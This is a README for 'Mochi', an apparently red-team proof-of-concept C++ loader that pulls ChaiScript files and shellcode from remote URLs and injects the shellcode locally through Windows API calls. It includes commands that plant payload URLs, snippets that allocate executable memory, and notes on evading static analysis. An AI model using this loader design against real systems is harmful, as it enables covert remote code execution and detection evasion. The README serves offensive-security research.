# Mochi | 餅

![logo](mochi-img.png)

## Overview
Mochi is a proof-of-concept C++ loader that leverages the [ChaiScript](https://chaiscript.com/) embedded scripting language to execute code. It is based on the [lcscript](https://github.com/domzigm/lcscript) project that extends ChaiScript with native Windows API call support. Mochi was built to allow remote loading of ChaiScript files that orchestrate lower level code and execute offensive actions with the Windows API.

Using a scripting language to extend malware in C++ is not a new idea. Of notable mention is the [Flame malware](https://en.wikipedia.org/wiki/Flame_(malware)), whose authors scripted high-level logic in [Lua](https://www.lua.org/). However, Mochi demonstrates that ChaiScript can be a viable alternative for implementing modularity and interacting with the Windows API from a scripting language. Additionally, ChaiScript was designed from the beginning to be used with C++. This makes integration and development straightforward for projects written in that language.

Inspiration for this capability came from the game development community and their usage of scripting languages with game engines. ChaiScript has been integrated into several game engines to support scripting functionality. For reference, see the following projects:
* https://github.com/libretro/libretro-chailove
* https://github.com/sainteos/nymph-game-engine
* https://gitlab.com/define-private-public/Masala

![screen_0](https://i.imgur.com/VhwNCdO.png)

## Features
* Code to perform tasks such as process injection can be omitted from the loader until required by an operator at runtime.
* Easily extend the Mochi loader with additional functionality using ChaiScript files. 
    * Included sample script ([inject.chai](Mochi/scripts/inject.chai)) demonstrates usage of the Windows APIs (VirtualAlloc, RtlMoveMemory) to setup shellcode injection.

## Limitations
* Code used to expose ChaiScript to the Windows API is no longer maintained by the original author.
* Usage of pointers within ChaiScript Windows API calls is complicated.
* A limited number of Windows API calls have been tested and successfully used within ChaiScript, there may be issues with implementing more complicated APIs.
* The `inject.chai` script sets up memory for process injection, but relies on a function defined within `Mochi.cpp` to perform the execution.

## Setup

### Build Environment
* A Windows 10 host was used as the environment for testing/compilation. 
* Visual Studio 2019 was used for development of this project.
* The Visual Studio package [Desktop Development with C++](https://devblogs.microsoft.com/cppblog/windows-desktop-development-with-c-in-visual-studio) was installed to support building the loader in C++.
* vcpkg was used to build and install the required ChaiScript libraries, it can be installed [here](https://github.com/microsoft/vcpkg#quick-start-windows).

### Automated Installation with vcpkg
I've used the script located [here](/helper_scripts/install_chaiscript_cpp_deps.ps1) to automate installation of **vcpkg** and the **ChaiScript** libraries on my host. Use this if you don't already have vcpkg installed.
* **NOTE:** Git is needed to fetch the vcpkg repo from GitHub and can be installed for Windows [here](https://gitforwindows.org).

### Manual Installation with vcpkg

To build the ChaiScript libraries, navigate to the location of your vcpkg install and execute the following command:
```
.\vcpkg.exe install chaiscript:x64-windows-static
```

## Usage

### Proof-of-Concept
The Mochi loader implements local process injection of a shellcode payload. This is intended to demonstrate the technique of using ChaiScript files that leverage the Windows API for offensive tasks. It does this by fetching the contents of a ChaiScript file, executing the script, the script will fetch the contents of a shellcode payload, it will call the Windows APIs to allocate/write memory and then call a function from inside Mochi to execute the memory.

To run the Mochi PoC, you'll need to perform the following steps:
1. Generate a shellcode payload in binary format.
* During testing, [sRDI](https://github.com/monoxgas/sRDI) was used to convert a [message box payload](https://github.com/monoxgas/sRDI/tree/master/TestDLL) DLL file to a shellcode "*.bin" file.
2. Upload the shellcode binary file to a remote hosting location, such as an S3 bucket. Obtain the URL and note it down.
3. Execute the following PowerShell helper script with your shellcode payload URL:
```
.\helper_scripts\chaiscript_inject_module_init.ps1 -payloadUrl "https://example.com/shellcode.bin"
```
4. At this point, the `inject.chai` file at the `Mochi\scripts\` path will be populated with your shellcode payload URL and be ready to execute.
5. Upload the `inject.chai` file to a remote hosting location, such as an S3 bucket. Obtain the URL and note it down.
6. Execute the following PowerShell helper script with your ChaiScript file URL:
```
.\helper_scripts\chaiscript_inject_module_init.ps1 -scriptUrl "https://example.com/inject.chai"
```
7. At this point, the `Mochi.cpp` file at the `Mochi\` path will be populated with your ChaiScript file URL and be ready for compilation.
8. Compile Mochi in the Visual Studio project and execute binary to validate successful initialization.

### Writing Scripts
To demonstrate how scripts can be written with ChaiScript to call the Windows API, see the following steps to call VirtualAlloc from kernel32.dll inside a ChaiScript file:
1. Import the library:
```
var libKernel32 = LoadLibrary("kernel32.dll");
```
2. Initialize the desired function:
```
var allocMem = funCall();
allocMem.init(libKernel32, "VirtualAlloc", 2);
```
3. Set up the required arguments:
```
var payload = "\xde\xad\xbe\xef";
var size = payload.size();
var allocType = 0x00001000;
var memProtect = 0x40;

allocMem.argUInt64(0);
allocMem.argUInt64(size);
allocMem.argUInt64(allocType);
allocMem.argUInt64(memProtect);
```
4. Call the function and assign the return value to a variable:
```
var allocAddr = allocMem.evalUInt64();
```

## OPSEC Considerations
Due to the PoC nature of this project, it was not built with OPSEC in mind. However, I will outline some possible features that could be present in a production deployment of this kind of project as well as OPSEC caveats:
* Feature: Encryption/decryption of ChaiScript files.
* Feature: Obfuscation/deobfuscation of ChaiScript files.
* Feature: Addition of ChaiScript modules that implement more modern methods of shellcode injection.
* Feature: Built-in string obfuscation in Mochi.
* Caveat: Mochi obscures the malicious intent of the binary during static analysis by omitting offensive functionality until execution of ChaiScript files during launch. It will ***NOT*** change anything from an evasion standpoint when it is observed during dynamic analysis. Additional obfuscation and evasion would need to be implemented in the ChaiScript files themselves if the intent is to mislead dynamic analysis tooling.

## Credits
* Dominik for the Windows API call support: https://github.com/domzigm/lcscript
* ondradus for the PoC HTTP request code: https://github.com/ondradus/WinINet---Simple-GET-POST-request
